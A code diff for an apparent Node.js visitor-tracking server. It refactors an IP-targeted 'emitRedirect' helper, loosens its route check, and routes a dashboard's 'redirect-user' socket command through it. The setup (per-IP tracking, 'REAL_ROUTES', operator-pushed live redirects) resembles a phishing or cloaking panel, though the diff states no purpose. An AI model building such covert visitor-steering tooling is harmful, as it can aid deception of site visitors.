@@ -234,6 +234,30 @@ const isSystemPath = (path) => {
     path.startsWith('/favicon');
 };
 
+// Standard function for emitting redirect events
+const emitRedirect = (ip, url, currentPath) => {
+  if (ipCache.has(ip)) {
+    const visitorData = ipCache.get(ip);
+    // Only redirect if visitor is online
+    if (visitorData.isOnline) {
+      console.log(`Redirecting IP ${ip} to ${url} from ${visitorData.lastPath}`);
+      // Always include the REAL_ROUTES so client can check if they should redirect
+      io.emit('redirect', {
+        ip,
+        url,
+        targetPaths: REAL_ROUTES,
+        currentPath: currentPath || visitorData.lastPath
+      });
+      return true;
+    } else {
+      console.log(`Skipping redirect for IP ${ip} - visitor not online (current path: ${visitorData.lastPath})`);
+      return false;
+    }
+  } else {
+    console.log(`Cannot redirect IP ${ip} - not found in visitor cache`);
+    return false;
+  }
+};
 
 // Geo data cache to reduce API calls
 const geoDataCache = new Map();
@@ -595,27 +619,7 @@ function parseUserAgent(userAgent) {
     path.startsWith('/favicon');
 };
 
-// Standard function for emitting redirect events
-const emitRedirect = (ip, url, currentPath) => {
-  if (ipCache.has(ip)) {
-    const visitorData = ipCache.get(ip);
-    // Only redirect if visitor is online and on a target path
-    if (visitorData.isOnline && REAL_ROUTES.includes(visitorData.lastPath)) {
-      console.log(`Redirecting IP ${ip} to ${url} from ${visitorData.lastPath}`);
-      io.emit('redirect', {
-        ip,
-        url,
-        targetPaths: REAL_ROUTES,
-        currentPath: currentPath || visitorData.lastPath
-      });
-      return true;
-    } else {
-      console.log(`Skipping redirect for IP ${ip} - not online or not on target path (current: ${visitorData.lastPath})`);
-      return false;
-    }
-  }
-  return false;
-};
+
 
 // Visitor tracking middleware - add this before other middleware
 async function detectMiddleware(req, res, next) {
@@ -1489,13 +1493,11 @@ http.listen(PORT, () => {
 
     // Handle redirect requests from dashboard
     socket.on('redirect-user', (data) => {
-      // Include target paths in the redirect event
-      io.emit('redirect', { 
-        url: data.url, 
-        ip: data.ip,
-        targetPaths: REAL_ROUTES,
-        currentPath: data.path || '/'
-      });
+      const { ip, url } = data;
+      console.log(`Dashboard requested redirect for IP ${ip} to ${url}`);
+      
+      // Use the emitRedirect helper function for consistency
+      emitRedirect(ip, url, data.path);
     });
 
     // Helper function to get and update client IP from event data
